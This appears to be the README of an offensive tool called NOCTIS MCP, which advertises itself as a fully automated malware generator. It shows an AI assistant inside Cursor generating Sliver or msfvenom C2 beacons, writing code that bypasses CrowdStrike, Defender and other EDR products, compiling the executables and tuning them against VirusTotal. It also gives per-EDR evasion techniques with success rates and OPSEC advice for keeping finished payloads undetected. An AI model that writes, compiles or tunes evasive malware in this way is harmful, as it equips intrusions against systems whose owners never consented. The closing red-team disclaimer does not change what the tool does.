# NOCTIS MCP v3.0
## Fully Automated Malware Generator with RAG Intelligence

**Status:** Production Ready | **Version:** 3.0.0

---

## 🎯 What It Does

**You say:** "Build beacon for CrowdStrike at 10.0.0.5:443"

**System delivers:** Working .exe that connects to your C2

### Complete Automated Workflow:

```
1. RAG Intelligence → Searches techniques/*.c for working code
2. AI Writes Code → Combines techniques dynamically
3. Beacon Generation → Sliver/msfvenom with YOUR IP
4. Compilation → MinGW with auto-detected dependencies
5. Testing → VirusTotal (prototypes only)
6. Learning → Records what works against each EDR
```

---

## 🎉 **NEW: Staged Payload Loader**

**Automated EDR-bypassing loader system** - See `staged-loader/` directory!

```bash
cd staged-loader/
./setup.sh        # One command setup!
```

**Features:**
- ✅ Bypasses Windows Defender
- ✅ Staged download (no MSFVenom in binary)
- ✅ RC4 encryption
- ✅ Fully automated

**Docs:** [staged-loader/README.md](staged-loader/README.md) | [QUICKSTART](staged-loader/QUICKSTART.md)

---

## 🚀 Quick Start

### 1. Install Dependencies

```bash
# Install Python packages
pip install -r requirements.txt

# Install MinGW (for compilation)
sudo apt install mingw-w64

# Install Sliver (optional but recommended)
curl https://sliver.sh/install | sudo bash

# Or install Metasploit (for msfvenom)
sudo apt install metasploit-framework
```

### 2. Configure VirusTotal (Optional)

```bash
# Copy example env file
cp .env.example .env

# Edit .env and add your VT API key
# Get free key at: https://www.virustotal.com/gui/my-apikey
echo "VIRUSTOTAL_API_KEY=your_key_here" >> .env
```

### 3. Start Server

```bash
./start_server.sh

# Or manually:
python3 server/noctis_server.py
```

### 4. Configure MCP in Cursor

Settings → Features → Model Context Protocol → Edit Config

Add this to your MCP config:

```json
{
  "mcpServers": {
    "noctis-mcp-v3": {
      "command": "python3",
      "args": ["-m", "noctis_mcp.noctis_tools"],
      "cwd": "/home/yenn/Documents/Noctis-AI/Noctis-MCP",
      "description": "Noctis MCP v3.0"
    }
  }
}
```

---

## 📋 MCP Tools (5 Essential)

### 1. `noctis_get_edr_bypasses(target_edr)`
**Get bypass techniques for specific EDR**

```python
noctis_get_edr_bypasses("CrowdStrike")

# Returns:
# - Recommended techniques (hwbp_syscalls, waiting_thread_hijacking, etw_bypass)
# - Code snippets from RAG
# - OPSEC guidance
```

### 2. `noctis_generate_beacon(c2_type, listener_ip, listener_port, architecture)`
**Generate C2 beacon with ANY IP**

```python
noctis_generate_beacon("sliver", "10.0.0.5", 443, "x64")

# Supports:
# - c2_type: "sliver" or "msfvenom"
# - listener_ip: ANY IP (10.x, 192.168.x, public IP)
# - Returns: C array format shellcode ready to paste
```

### 3. `noctis_compile(source_file, target_edr, architecture)`
**Compile with auto-detected dependencies**

```python
noctis_compile("my_beacon.c", "CrowdStrike", "x64")

# Auto-detects:
# - Zilean, poolparty, syswhispers3, etc from #include
# - Compiles with MinGW
# - EDR-specific optimizations
```

### 4. `noctis_test_binary(binary_path, target_edr)`
**Test on VirusTotal (prototypes only!)**

```python
noctis_test_binary("compiled/beacon.exe", "CrowdStrike")

# Returns:
# - Detection rate (e.g., 3/70)
# - CrowdStrike specific result
# - Top 5 detections
```

### 5. `noctis_record_result(target_edr, detected, techniques, notes)`
**Record test results for learning**

```python
noctis_record_result("CrowdStrike", False, "hwbp_syscalls,waiting_thread_hijacking", "Bypassed successfully")

# System learns:
# - What works against each EDR
# - Updates recommendations
# - Improves future suggestions
```

---

## 💻 Complete Usage Example

### In Cursor with AI:

```
YOU: Build a beacon to bypass CrowdStrike, connect to 10.0.0.5:443

AI: Let me build that for you...

[AI calls: noctis_get_edr_bypasses("CrowdStrike")]
Found techniques: hwbp_syscalls (88% success), waiting_thread_hijacking (90%), etw_bypass (85%)

[AI calls: noctis_generate_beacon("sliver", "10.0.0.5", 443)]
Generated 4,832 bytes of shellcode

[AI writes: crowdstrike_beacon.c]
... AI writes malware code combining techniques + shellcode ...

[AI calls: noctis_compile("crowdstrike_beacon.c", "CrowdStrike", "x64")]
Compiled: beacon.exe (67 KB)

[AI calls: noctis_test_binary("compiled/beacon.exe", "CrowdStrike")]
Detection: 3/70 (CrowdStrike: CLEAN ✓)

DONE! beacon.exe is ready at: compiled/beacon.exe
```

---

## 🎯 Target EDRs (10 Supported)

| EDR | Recommended Techniques | Success Rate |
|-----|----------------------|--------------|
| Microsoft Defender | indirect_syscalls, zilean_sleep, poolparty | 85% |
| CrowdStrike Falcon | hwbp_syscalls, waiting_thread_hijacking, etw_bypass | 88% |
| SentinelOne | module_stomping, memory_bouncing, hwbp_syscalls | 82% |
| Sophos Intercept X | indirect_syscalls, zilean_sleep, poolparty | 85% |
| Trend Micro Vision One | indirect_syscalls, poolparty, zilean_sleep | 82% |
| Carbon Black | module_stomping, transacted_hollowing, hwbp_syscalls | 85% |
| Palo Alto Cortex XDR | hwbp_syscalls, memory_bouncing, etw_bypass | 80% |
| Trellix (McAfee) | indirect_syscalls, zilean_sleep, poolparty | 85% |
| ESET PROTECT | indirect_syscalls, module_stomping, zilean_sleep | 82% |
| Bitdefender GravityZone | hwbp_syscalls, transacted_hollowing, memory_bouncing | 85% |

---

## 🔧 How It Works

### RAG Intelligence (Not Code Generation!)

- **RAG provides:** Technique descriptions, code snippets, OPSEC guidance
- **AI writes:** New malware code based on intelligence
- **NOT copy-paste:** AI synthesizes techniques intelligently

### Dynamic IP Handling

```python
# Works with ANY IP:
noctis_generate_beacon("sliver", "10.0.0.5", 443)    # Private
noctis_generate_beacon("sliver", "192.168.1.100", 8080)  # Local
noctis_generate_beacon("sliver", "1.2.3.4", 443)     # Public
```

### Auto-Dependency Detection

```c
// In your code:
#include "techniques/syscalls/syswhispers3.h"
#include "techniques/sleep_obfuscation/zilean.h"

// Compiler auto-detects and links:
// - techniques/syscalls/syswhispers3.c
// - techniques/sleep_obfuscation/zilean.c
```

### Learning System

Every time you test:
```python
noctis_record_result("CrowdStrike", False, "hwbp_syscalls", "Worked perfectly")
```

System updates database:
- Increases hwbp_syscalls success rate for CrowdStrike
- Recommends this combo more often
- Learns from YOUR real-world tests

---

## 📁 Project Structure

```
Noctis-MCP/
├── server/
│   ├── noctis_server.py       # Main Flask server
│   ├── edr_intel.py            # EDR intelligence database
│   ├── vt_tester.py            # VirusTotal integration
│   ├── learning_tracker.py    # SQLite learning database
│   └── rag/
│       └── rag_engine.py       # Simple RAG (file-based)
│
├── noctis_mcp/
│   └── noctis_tools.py         # 5 MCP tools
│
├── c2_adapters/
│   ├── sliver_adapter.py       # Sliver beacon generation
│   └── msfvenom_adapter.py     # Msfvenom shellcode generation
│
├── compilation/
│   └── compiler.py             # MinGW wrapper with auto-deps
│
├── techniques/                 # ✅ Existing working code
│   ├── syscalls/
│   ├── injection/
│   ├── sleep_obfuscation/
│   ├── unhooking/
│   └── ... (all existing techniques)
│
├── compiled/                   # Output binaries
├── output/                     # Shellcode output
├── data/                       # Learning database
└── logs/                       # Server logs
```

---

## ⚠️  Important Notes

### VirusTotal OPSEC

```
✅ DO: Test early prototypes on VT to iterate
❌ DON'T: Test final production binary on VT
```

**Why:** VT shares samples with AV vendors. Test prototypes, iterate, then compile final version and keep it OFF VirusTotal.

### C2 Setup

**Before generating beacons:**

1. Start Sliver server: `sliver-server`
2. Create listener: `https --lhost <IP> --lport 443`
3. Then generate beacon with that IP

**Or use msfvenom** (no server needed):

```python
noctis_generate_beacon("msfvenom", "10.0.0.5", 4444)
# Then start handler separately: msfconsole -q -x "use exploit/multi/handler"
```

---

## 🧪 Testing Workflow

### 1. Development Phase (VT Testing OK)

```python
# Generate test beacon
noctis_generate_beacon("sliver", "10.0.0.5", 443)

# AI writes test_v1.c
# Compile
noctis_compile("test_v1.c", "CrowdStrike")

# Test on VT
noctis_test_binary("compiled/test_v1.exe", "CrowdStrike")
# Result: 15% detection

# Iterate - AI improves code
# Compile test_v2.c
noctis_compile("test_v2.c", "CrowdStrike")

# Test again
noctis_test_binary("compiled/test_v2.exe", "CrowdStrike")
# Result: 5% detection, CrowdStrike CLEAN ✓
```

### 2. Production Phase (NO VT!)

```python
# Compile FINAL version
noctis_compile("final_beacon.c", "CrowdStrike")

# DO NOT TEST ON VT!

# Test in isolated environment with real CrowdStrike
# Then record result
noctis_record_result("CrowdStrike", False, "hwbp_syscalls,waiting_thread_hijacking", "Full bypass confirmed")
```

---

## 🔥 Success Metrics

**What Makes v3.0 Different:**

- ✅ **Fully Automated:** Start to finish in minutes
- ✅ **Dynamic IP:** Any IP address works
- ✅ **RAG Intelligence:** AI writes code from real implementations
- ✅ **Auto-Compilation:** Detects dependencies automatically
- ✅ **Learning System:** Gets smarter with each test
- ✅ **EDR-Specific:** Targets 10 major EDRs
- ✅ **Production Ready:** Real beacons that connect

**Not Just a Tool - It's a System:**

- User gives objective
- System generates working malware
- System compiles it
- System tests it (optional)
- System learns from results
- System gets better over time

---

## 📞 Support

- Test against your EDRs
- Record results with `noctis_record_result()`
- System learns and improves

---

## ⚖️ Legal

**For authorized red team operations only.**

Never use against systems you don't own or have written permission to test.

---

**Built by:** Noctis Team
**Version:** 3.0.0 (Clean Rebuild)
**Status:** Production Ready ✅
